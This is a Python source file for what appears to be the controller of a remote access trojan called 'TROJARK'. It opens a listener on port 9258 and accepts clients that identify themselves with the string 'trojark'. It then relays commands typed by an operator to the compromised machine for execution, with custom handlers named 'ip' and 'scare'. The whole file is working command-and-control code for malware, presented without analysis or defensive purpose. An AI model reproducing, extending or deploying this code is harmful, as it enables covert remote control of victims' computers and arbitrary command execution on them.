import socket
import chalk
from pyfiglet import Figlet
import os
import overrides

def clear():
  if os.name == "nt":
      os.system("cls")
  else:
      os.system("clear")

clear()

# Banner
banner = Figlet(font="alligator2")
# print("\n")
print(banner.renderText("TROJARK"))
print("----------------------------")
print("Current platform: " + os.name)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("0.0.0.0", 9258))
s.listen(5)
print(chalk.cyan("Awaiting connections"))

command_overrides = {"ip": overrides.ip, "scare": overrides.scare}

while True:
    clientsocket, address = s.accept()
    print(chalk.green(f"Connection from {address} established"))

    valid_client = clientsocket.recv(1024)
    if valid_client.decode("utf-8") == "trojark":
        print(chalk.green("Client is valid Trojark client"))

        while True:
            cmd = input(f"{address[0]}> ")
            if cmd == "exit":
                clientsocket.close()
                print("Connection closed")
                print(chalk.cyan("Awaiting connections"))
                break
            else:
                cmd_override = command_overrides.get(cmd)
                if cmd_override:
                    cmd_override(clientsocket, address)
                else:
                    print("Command override not found; executing")
                    clientsocket.send(bytes(cmd, "utf-8"))

                response = clientsocket.recv(1024)
                print(response.decode("utf-8"))
    else:
        clientsocket.close()
        print(chalk.red("Client is not valid Trojark client. Closing connection..."))
